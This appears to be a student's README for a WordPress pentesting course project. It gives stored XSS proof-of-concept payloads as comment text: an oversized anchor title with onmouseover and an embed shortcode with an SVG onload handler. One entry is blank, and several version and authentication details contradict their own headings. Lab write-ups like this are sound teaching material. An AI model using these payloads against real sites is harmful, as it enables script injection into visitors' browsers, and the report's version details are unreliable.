# Week-7-Project-WordPress-vs.-Kali

# Project 7 - WordPress Pentesting

Time spent: **20** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

(Required) WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
1. (Required) XSS
  - [ ] Summary: XSS
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: <img src='1.gif' width=800>
  - [ ] Steps to recreate: Autheticated user must comment <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAA...[64KB]...AAA></a> to successfully plan the vulnerability.
  - [ ] Affected source code:
    
(Required) 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
2. (Required) XSS
  - [ ] Summary: YouTube embedded
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: <img src='2.gif' width=800>
  - [ ] Steps to recreate: Autheticated user must comment [embed src='https://youtube.com/embed/12345\x3csvg onload=alert("hgiytfiyt")\x3e'][/embed] to successfully plan the vulnerability
  - [ ] Affected source code:


  3. (Required) XSS
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.7.2
    - Fixed in version: 4.7.3
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
  
  
## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2018] [Jisheng Huang]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
